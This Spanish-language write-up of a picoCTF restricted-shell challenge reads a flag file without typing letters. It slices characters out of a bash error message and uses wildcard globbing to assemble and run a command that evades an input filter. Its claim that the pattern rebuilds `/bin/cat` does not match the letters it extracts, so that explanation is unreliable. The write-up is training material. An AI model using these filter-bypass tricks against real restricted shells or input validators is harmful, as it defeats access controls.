#### Description

The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols. `ssh -p 52198 ctf-player@mimas.picoctf.net` Use password: `84b12bae`

Connect using:

```bash
ssh -p 52198 ctf-player@mimas.picoctf.net
```

Password:

```text
84b12bae
```

---

## Conexión al servidor

```bash
ssh -p 52198 ctf-player@mimas.picoctf.net
```

---

no se puede usar comandos como en los otros retos

```bash
cat flag.txt
```


## Exploración inicial

Se intenta ejecutar archivos en subdirectorios:

```bash
./*/*
```

Output:

```text
bash: ./blargh/flag.txt: Permission denied
```

### Explicación

- `*` es un wildcard que representa cualquier nombre
    
- `./*/*` intenta acceder a archivos dentro de carpetas
    

Se detecta el archivo:

```text
./blargh/flag.txt
```

Pero no se puede ejecutar directamente por permisos.

## Generación de texto sin usar letras

Se ejecuta:

```bash
_1=`$ 2>&1`
```

### Explicación

- `$` por sí solo genera un error
    
- `2>&1` redirige el error a salida estándar
    
- El resultado se guarda en la variable `_1`
    

Contenido aproximado de `_1`:

```text
bash: $: command not found
```

---

## Extracción de caracteres

Se utilizan substrings:

```bash
${_1:9:1}
${_1:10:1}
```

### Explicación

Sintaxis:

```bash
${variable:posición:longitud}
```

Esto permite extraer letras específicas del mensaje de error sin escribirlas manualmente.

Se arma el comando dinámicamente:

```bash
/???/?${_1:9:1}?${_1:10:1}
```

### Explicación

- `/???/` coincide con rutas como `/bin/`
    
- `?` representa un carácter
    
- `${_1:...}` inserta letras extraídas
    

Esto reconstruye un comando como:

```bash
/bin/cat
```

---

## Lectura del archivo sin escribir su nombre

Se utiliza:

```bash
"$(<./*/????.???)"
```

### Explicación

- `./*/????.???` busca archivos como `flag.txt`
    
- `< archivo` lee el contenido
    
- `$()` ejecuta la expresión
    

---

## Ejecución final

```bash
/???/?${_1:9:1}?${_1:10:1} "$(<./*/????.???)"
```

---

Como resultado dará la flag.

## Conceptos aprendidos

### 1. Wildcards

|Símbolo|Significado|
|---|---|
|`*`|cualquier cadena|
|`?`|un solo carácter|

### 2. Redirección de errores

```bash
2>&1
```

- Redirige errores (`stderr`) a salida estándar (`stdout`)
    

---

### 3. Substrings en Bash

```bash
${var:pos:len}
```

Permite extraer caracteres de una cadena.

---

### 4. Command substitution

```bash
$(...)
```

Ejecuta comandos dentro de otros comandos.

---

### 5. Lectura de archivos sin `cat`

```bash
$(<archivo)
```

Forma alternativa de leer archivos.

---